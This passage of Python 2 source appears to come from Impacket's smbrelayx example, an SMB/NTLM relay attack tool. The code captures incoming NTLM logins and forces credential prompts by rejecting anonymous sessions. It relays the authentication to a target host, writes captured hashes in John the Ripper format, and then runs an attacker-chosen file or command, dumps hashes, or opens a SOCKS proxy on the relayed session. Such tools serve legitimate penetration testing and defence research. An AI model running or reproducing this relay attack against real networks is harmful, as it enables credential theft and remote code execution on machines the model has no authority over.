                clientChallengeMessage = smbClient.sendNegotiate(token) 
                challengeMessage = NTLMAuthChallenge()
                challengeMessage.fromString(clientChallengeMessage)
                #############################################################

                respToken = SPNEGO_NegTokenResp()
                # accept-incomplete. We want more data
                respToken['NegResult'] = '\x01'  
                respToken['SupportedMech'] = TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']

                respToken['ResponseToken'] = str(challengeMessage)

                # Setting the packet to STATUS_MORE_PROCESSING
                errorCode = STATUS_MORE_PROCESSING_REQUIRED
                # Let's set up an UID for this connection and store it 
                # in the connection's data
                # Picking a fixed value
                # TODO: Manage more UIDs for the same session
                connData['Uid'] = 10
                # Let's store it in the connection data
                connData['CHALLENGE_MESSAGE'] = challengeMessage

            elif messageType == 0x03:
                # AUTHENTICATE_MESSAGE, here we deal with authentication

                #############################################################
                # SMBRelay: Ok, so now the have the Auth token, let's send it
                # back to the target system and hope for the best.
                smbClient = smbData[self.target]['SMBClient']
                authenticateMessage = NTLMAuthChallengeResponse()
                authenticateMessage.fromString(token)
                if authenticateMessage['user_name'] != '':
                    clientResponse, errorCode = smbClient.sendAuth(connData['CHALLENGE_MESSAGE']['challenge'],
                                                                   sessionSetupData['SecurityBlob'])
                else:
                    # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
                    errorCode = STATUS_ACCESS_DENIED

                if errorCode != STATUS_SUCCESS:
                    # Let's return what the target returned, hope the client connects back again
                    packet = NewSMBPacket()
                    packet['Flags1']  = SMB.FLAGS1_REPLY | SMB.FLAGS1_PATHCASELESS
                    packet['Flags2']  = SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_EXTENDED_SECURITY
                    packet['Command'] = recvPacket['Command']
                    packet['Pid']     = recvPacket['Pid']
                    packet['Tid']     = recvPacket['Tid']
                    packet['Mid']     = recvPacket['Mid']
                    packet['Uid']     = recvPacket['Uid']
                    packet['Data']    = '\x00\x00\x00'
                    packet['ErrorCode']   = errorCode >> 16
                    packet['ErrorClass']  = errorCode & 0xff
                    # Reset the UID
                    smbClient.setUid(0)
                    logging.error("Authenticating against %s as %s\%s FAILED" % (
                    self.target, authenticateMessage['domain_name'], authenticateMessage['user_name']))
                    # del (smbData[self.target])
                    return None, [packet], errorCode
                else:
                    # We have a session, create a thread and do whatever we want
                    logging.info("Authenticating against %s as %s\%s SUCCEED" % (
                    self.target, authenticateMessage['domain_name'], authenticateMessage['user_name']))
                    ntlm_hash_data = outputToJohnFormat(connData['CHALLENGE_MESSAGE']['challenge'],
                                                        authenticateMessage['user_name'],
                                                        authenticateMessage['domain_name'],
                                                        authenticateMessage['lanman'], authenticateMessage['ntlm'])
                    logging.info(ntlm_hash_data['hash_string'])
                    if self.server.getJTRdumpPath() != '':
                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                              self.server.getJTRdumpPath())

                    # Target will be attacked, adding to the attacked set
                    # If the attack fails, the doAttack thread will be responsible of removing it from the set
                    ATTACKED_HOSTS.add(self.target)
                    if self.runSocks is True:
                        # Pass all the data to the socksplugins proxy
                        protocolClient = SMBRelayClient(None, urlparse('smb://%s' % self.target))
                        protocolClient.session = SMBConnection(existingConnection=smbClient)
                        activeConnections.put((self.target, 445, 'SMB',
                                               ('%s/%s' % (
                                                   authenticateMessage['domain_name'].decode('utf-16le'),
                                                   authenticateMessage['user_name'].decode('utf-16le'))).upper(),
                                               protocolClient, connData))
                        logging.info("Adding %s(445) to active SOCKS connection. Enjoy" % self.target)
                        del (smbData[self.target])
                    else:
                        del (smbData[self.target])
                        clientThread = doAttack(smbClient,self.exeFile,self.command)
                        clientThread.start()


                    # Now continue with the server
                #############################################################

                # Return status code of the authentication process.
                errorCode = self.returnStatus
                logging.info("Sending status code %s after authentication to %s" % (
                ERROR_MESSAGES[self.returnStatus][0], connData['ClientIP']))

                respToken = SPNEGO_NegTokenResp()
                # accept-completed
                respToken['NegResult'] = '\x00'

                # Status SUCCESS
                # Let's store it in the connection data
                connData['AUTHENTICATE_MESSAGE'] = authenticateMessage
            else:
                raise Exception("Unknown NTLMSSP MessageType %d" % messageType)

            respParameters['SecurityBlobLength'] = len(respToken)

            respData['SecurityBlobLength'] = respParameters['SecurityBlobLength'] 
            respData['SecurityBlob']       = respToken.getData()

        else:
            # Process Standard Security
            respParameters = SMBSessionSetupAndXResponse_Parameters()
            respData       = SMBSessionSetupAndXResponse_Data()
            sessionSetupParameters = SMBSessionSetupAndX_Parameters(smbCommand['Parameters'])
            sessionSetupData = SMBSessionSetupAndX_Data()
            sessionSetupData['AnsiPwdLength'] = sessionSetupParameters['AnsiPwdLength']
            sessionSetupData['UnicodePwdLength'] = sessionSetupParameters['UnicodePwdLength']
            sessionSetupData.fromString(smbCommand['Data'])
            connData['Capabilities'] = sessionSetupParameters['Capabilities']
            #############################################################
            # SMBRelay
            smbClient = smbData[self.target]['SMBClient']
            if sessionSetupData['Account'] != '':
                clientResponse, errorCode = smbClient.login_standard(sessionSetupData['Account'],
                                                                     sessionSetupData['PrimaryDomain'],
                                                                     sessionSetupData['AnsiPwd'],
                                                                     sessionSetupData['UnicodePwd'])
            else:
                # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
                errorCode = STATUS_ACCESS_DENIED

            if errorCode != STATUS_SUCCESS:
                # Let's return what the target returned, hope the client connects back again
                packet = NewSMBPacket()
                packet['Flags1']  = SMB.FLAGS1_REPLY | SMB.FLAGS1_PATHCASELESS
                packet['Flags2']  = SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_EXTENDED_SECURITY
                packet['Command'] = recvPacket['Command']
                packet['Pid']     = recvPacket['Pid']
                packet['Tid']     = recvPacket['Tid']
                packet['Mid']     = recvPacket['Mid']
                packet['Uid']     = recvPacket['Uid']
                packet['Data']    = '\x00\x00\x00'
                packet['ErrorCode']   = errorCode >> 16
                packet['ErrorClass']  = errorCode & 0xff
                # Reset the UID
                smbClient.setUid(0)
                return None, [packet], errorCode
                # Now continue with the server
            else:
                # We have a session, create a thread and do whatever we want
                ntlm_hash_data = outputToJohnFormat('', sessionSetupData['Account'], sessionSetupData['PrimaryDomain'],
                                                    sessionSetupData['AnsiPwd'], sessionSetupData['UnicodePwd'])
                logging.info(ntlm_hash_data['hash_string'])
                if self.server.getJTRdumpPath() != '':
                    writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                          self.server.getJTRdumpPath())
                # Target will be attacked, adding to the attacked set
                # If the attack fails, the doAttack thread will be responsible of removing it from the set
                ATTACKED_HOSTS.add(self.target)
                if self.runSocks is True:
                    # Pass all the data to the socksplugins proxy
                    protocolClient = SMBRelayClient(None, urlparse('smb://%s' % self.target))
                    protocolClient.session = SMBConnection(existingConnection=smbClient)
                    activeConnections.put((self.target, 445, 'SMB',
                                           ('%s/%s' % (
                                               sessionSetupData['PrimaryDomain'],
                                               sessionSetupData['Account'])).upper(),
                                           protocolClient, connData))
                    logging.info("Adding %s(445) to active SOCKS connection. Enjoy" % self.target)
                    # Remove the target server from our connection list, the work is done
                    del (smbData[self.target])
                else:
                    # Remove the target server from our connection list, the work is done
                    del (smbData[self.target])
                    clientThread = doAttack(smbClient, self.exeFile, self.command)
                    clientThread.start()
                # Now continue with the server


            #############################################################

            # Do the verification here, for just now we grant access
            # TODO: Manage more UIDs for the same session
            errorCode = self.returnStatus
            logging.info("Sending status code %s after authentication to %s" % (
            ERROR_MESSAGES[self.returnStatus][0], connData['ClientIP']))
            connData['Uid'] = 10
            respParameters['Action'] = 0

        respData['NativeOS']     = smbServer.getServerOS()
        respData['NativeLanMan'] = smbServer.getServerOS()
        respSMBCommand['Parameters'] = respParameters
        respSMBCommand['Data']       = respData 

        # From now on, the client can ask for other commands
        connData['Authenticated'] = True
        #############################################################
        # SMBRelay
        smbServer.setConnectionData('SMBRelay', smbData)
        #############################################################
        smbServer.setConnectionData(connId, connData)

        return [respSMBCommand], None, errorCode

    def _start(self):
        self.server.serve_forever()

    def run(self):
        logging.info("Setting up SMB Server")
        self._start()

    def setTargets(self, targets):
        self.target = targets 

    def setExeFile(self, filename):
        self.exeFile = filename

    def setCommand(self, command):
        self.command = command

    def setSocks(self, socks):
        self.runSocks = socks

    def setReturnStatus(self, returnStatus):
        # Specifies return status after successful relayed authentication to return
        # to the connecting client. This comes useful when we don't want the connecting
        # client to store successful credentials in his memory. Valid statuses:
        # STATUS_SUCCESS - denotes that the connecting client passed valid credentials,
        #                   which will make him store them accordingly.
        # STATUS_ACCESS_DENIED - may occur for instance when the client is not a Domain Admin,
        #                       and got configured Remote UAC, thus preventing connection to ADMIN$
        # STATUS_LOGON_FAILURE - which will tell the connecting client that the passed credentials
        #                       are invalid.
        self.returnStatus = {
            'success' : STATUS_SUCCESS,
            'denied' : STATUS_ACCESS_DENIED,
            'logon_failure' : STATUS_LOGON_FAILURE
        }[returnStatus.lower()]

    def setMode(self,mode, one_shot):
        self.mode = mode
        self.one_shot = one_shot

    def setDomainAccount( self, machineAccount,  machineHashes, domainIp):
        self.machineAccount = machineAccount
        self.machineHashes = machineHashes
        self.domainIp = domainIp

# Process command-line arguments.
if __name__ == '__main__':

    RELAY_SERVERS = ( SMBRelayServer, HTTPRelayServer )
    # Init the example's logger theme
    logger.init()
    print version.BANNER
    parser = argparse.ArgumentParser(add_help=False,
                                     description="For every connection received, this module will try to SMB relay that "
                                                 " connection to the target system or the original client")
    parser.add_argument("--help", action="help", help='show this help message and exit')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-h', action='store', metavar='HOST',
                        help='Host to relay the credentials to, if not it will relay it back to the client')
    parser.add_argument('-s', action='store', choices={'success', 'denied', 'logon_failure'}, default='success',
                        help='Status to return after client performed authentication. Default: "success".')
    parser.add_argument('-e', action='store', required=False, metavar='FILE',
                        help='File to execute on the target system. If not specified, hashes will be dumped '
                        '(secretsdump.py must be in the same directory)')
    parser.add_argument('-c', action='store', type=str, required=False, metavar='COMMAND',
                        help='Command to execute on target system. If not specified, hashes will be dumped '
                             '(secretsdump.py must be in the same directory)')
    parser.add_argument('-socks', action='store_true', default=False,
                        help='Launch a SOCKS proxy for the connection relayed')
    parser.add_argument('-one-shot', action='store_true', default=False,
                        help='After successful authentication, only execute the attack once for each target')
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"%s"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                                                       'https://docs.python.org/2.4/lib/standard-encodings.html and then execute wmiexec.py '
                                                       'again with -codec and the corresponding codec ' % CODEC)
    parser.add_argument('-outputfile', action='store',
                        help='base output filename for encrypted hashes. Suffixes will be added for ntlm and ntlmv2')
    parser.add_argument('-machine-account', action='store', required=False,
                        help='Domain machine account to use when interacting with the domain to grab a session key for '
                             'signing, format is domain/machine_name')
    parser.add_argument('-machine-hashes', action="store", metavar="LMHASH:NTHASH",
                        help='Domain machine hashes, format is LMHASH:NTHASH')
    parser.add_argument('-domain', action="store", help='Domain FQDN or IP to connect using NETLOGON')

    try:
       options = parser.parse_args()
    except Exception, e:
       logging.error(str(e))
       sys.exit(1)

    if options.codec is not None:
        CODEC = options.codec

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)
        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)


    if options.h is not None:
        logging.info("Running in relay mode")
        mode = 'RELAY'
        targetSystem = options.h
    else:
        logging.info("Running in reflection mode")
        targetSystem = None
        mode = 'REFLECTION'

    exeFile = options.e
    Command = options.c
    returnStatus = options.s

    threads = set()

    if options.socks is True:
        # Start a SOCKS proxy in the background
        s1 = SOCKS()
        socks_thread = Thread(target=s1.serve_forever)
        socks_thread.daemon = True
        socks_thread.start()
        threads.add(socks_thread)

    for server in RELAY_SERVERS:
        s = server(options.outputfile)
        s.setTargets(targetSystem)
        s.setExeFile(exeFile)
        s.setCommand(Command)
        s.setSocks(options.socks)
        s.setReturnStatus(returnStatus)
        s.setMode(mode, options.one_shot)
        if options.machine_account is not None and options.machine_hashes is not None and options.domain is not None:
            s.setDomainAccount( options.machine_account,  options.machine_hashes,  options.domain)
        elif (options.machine_account is None and options.machine_hashes is None and options.domain is None) is False:
            logging.error("You must specify machine-account/hashes/domain all together!")
            sys.exit(1)

        s.start()
        threads.add(s)
        
    print ""
    logging.info("Servers started, waiting for connections")
    while True:
        try:
            sys.stdin.read()
        except KeyboardInterrupt:
            logging.info('Quitting.. please wait')
            if options.socks is True:
                s1.shutdown()
            for s in threads:
                del(s)
            sys.exit(1)
        else:
            pass

